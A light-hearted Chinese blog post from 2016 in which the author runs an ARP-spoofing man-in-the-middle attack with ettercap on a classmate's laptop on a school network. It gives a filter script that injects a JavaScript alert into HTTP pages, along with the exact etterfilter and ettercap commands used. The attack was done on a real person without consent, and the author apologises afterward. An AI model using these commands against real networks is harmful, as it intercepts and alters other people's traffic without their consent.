---
layout: post
title: 记一次非针对LGC的中间人攻击
excerpt: 真的是非针对哦(¬_¬)
date:   2016-09-13
tag:
  - hack
---

## 序
自从昨天9月12日停电以后，历二信竞队教室原本70Mbs的网络，莫名其妙的降到了10Mbs不到……网页大规模卡崩，ping baidu.com丢包严重。这对于历二信竞队来讲，简直就是一场灾难……  
  这差不多算是没了网，奥赛室一片死寂。Gengxin抬头望去，LGC居然还在看视频！！！  
  他在看视频！  
  在看视频！  
  看视频！  
  视频！  
  频！  
  ！  
这个就有点尴尬了……既然全教室的网这么慢，你还在看视频!Gengxin有点小愤怒。打开路由器管理界面，嗯……流量全在LGC那。很久以前就发现，LGC的小笔记本网卡似乎比我们的更好一点，在很远的地方也能收到wifi信号，并且……还是接近满格！如果让流量先经过Gengxin的渣渣网卡呢？\\(¬\_¬\)于是Gengxin默默的打开了自己的Kali虚拟机。  

## One
首先科普一下，什么是中间人攻击。  
中间人攻击（Man-in-the-middle attack，缩写：MITM）是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。（以上引自[维基百科](https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB)）。简单的说，就是LGC电脑的流量都会流经Gengxin的电脑，而路由器和LGC的电脑都会傻傻的以为自己正在安全的连接对方。  
这里，Gengxin用了一个非常有名的多用途嗅探器——ettercap。其实如果不用这个工具的话，攻击的过程也十分简单，可以用一个Python脚本轻松实现——scapy库查看编辑数据包是十分方便的。  

## Two  

Kali系统下ettercap是预置的，所以我不需要额外的安装。
<figure>
  <a href="http://images2015.cnblogs.com/blog/831801/201609/831801-20160913211455070-1683114145.jpg"><img src="http://images2015.cnblogs.com/blog/831801/201609/831801-20160913211455070-1683114145.jpg"></a>
</figure>
好的，既然LGC在浏览网页，那就来个HTML注入好了。“Gengxin 想 ban 你 哦”。  
我们首先要写一个过滤脚本。  

{% highlight cpp %}
if (ip.proto == TCP && tcp.dst == 80)
{
    if (search(DATA.data, "Accept-Encoding"))
    {
        replace("Accept-Encoding", "Gengxin-NoEncoding");
        msg("就是不让你压缩Q'W'Q\n");
    }
}
if (ip.proto == TCP && tcp.src == 80)
{
    replace("<head>", "<head><script type="text/javascript">alert('Gengxin想ban你哦QWQ');</script>");
    replace("<HEAD>", "<HEAD><script type="text/javascript">alert('Gengxin想ban你哦QWQ')');</script>");
    msg("成功注入Q'W'Q!!\n");
}  
{% endhighlight %}


这段代码第一个if块，是如果网页源码中有Accept-Encoding的时候，替换掉它（Accept-Encoding是声明浏览器支持的编码类型，在这里可以理解为请求压缩的意思）。第二个if块就是我们插入HTML的地方了。js代码里`alert("")`会使网页出现一个弹窗。这就是我要达到的目的。  

OK，把这段代码保存为`banLGC.filter`.   

接下来，编译我们刚刚的banLGC.filter脚本。代码如下：

~~~
etterfilter banLGC.filter -o banLGC.ef
~~~

接着，我们在路由器后台找到LGC的IP地址，然后用我们刚刚编译好的脚本，发起对LGC的中间人攻击

~~~
ettercap -i eth0 -Tq -M arp:remote /192.168.31.106// /192.168.31.1// -F banLGC.ef
~~~

然后在Gengxin的电脑上，成功的打印出了`成功注入Q'W'Q!!`

<figure>
  <a href="http://images2015.cnblogs.com/blog/831801/201609/831801-20160919114624871-1977932968.jpg"><img src="http://images2015.cnblogs.com/blog/831801/201609/831801-20160919114624871-1977932968.jpg"></a>
</figure>

猛然间，不远处的LGC发出了杠铃般的笑声————Gengxin！你要做什么！我网速是怎么了！！   

然后基友就一上午没有理我Q'A'Q  

最后Gengxin还是跟他又说明了情况，然后道了歉  

然后就没有然后了  
